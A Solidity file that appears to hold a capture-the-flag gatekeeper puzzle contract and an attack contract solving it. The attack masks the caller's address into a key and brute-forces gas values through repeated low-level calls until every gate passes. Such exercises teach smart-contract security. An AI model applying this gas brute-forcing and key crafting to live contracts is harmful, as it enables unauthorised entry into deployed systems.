// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import '@openzeppelin/contracts/math/SafeMath.sol';
import "hardhat/console.sol";

contract GateKeeperOne {

  using SafeMath for uint256;
  address public entrant;

  modifier gateOne() {
    require(msg.sender != tx.origin);
    _;
  }

  modifier gateTwo() {
    require(gasleft().mod(8191) == 0);
    _;
  }

  modifier gateThree(bytes8 _gateKey) {
      require(uint32(uint64(_gateKey)) == uint16(uint64(_gateKey)), "GatekeeperOne: invalid gateThree part one");
      require(uint32(uint64(_gateKey)) != uint64(_gateKey), "GatekeeperOne: invalid gateThree part two");
      require(uint32(uint64(_gateKey)) == uint16(tx.origin), "GatekeeperOne: invalid gateThree part three");
    _;
  }

  function enter(bytes8 _gateKey) public gateOne gateTwo gateThree(_gateKey) returns (bool) {
    entrant = tx.origin;
    return true;
  }
}


contract GateKeeperOneAttack {

    event Hacked(uint256 gasBrute);


    function attack( address gatekeeper,uint256 _lowerGasBrute, uint256 _upperGasBrute) external {

        bytes8 key = bytes8(uint64(msg.sender) & 0xFFFFFFFF0000FFFF);

         bool success;
        uint256 gasBrute;
         for(gasBrute = _lowerGasBrute; gasBrute <= _upperGasBrute; gasBrute++){
            (success, ) = gatekeeper.call{gas: (gasBrute + (8191 * 3))}(
                abi.encodeWithSignature("enter(bytes8)", key)
            );
            if(success){
                break;
            }
        }        
        require(success, "HACK FAILED");
        emit Hacked(gasBrute);
           
    }
}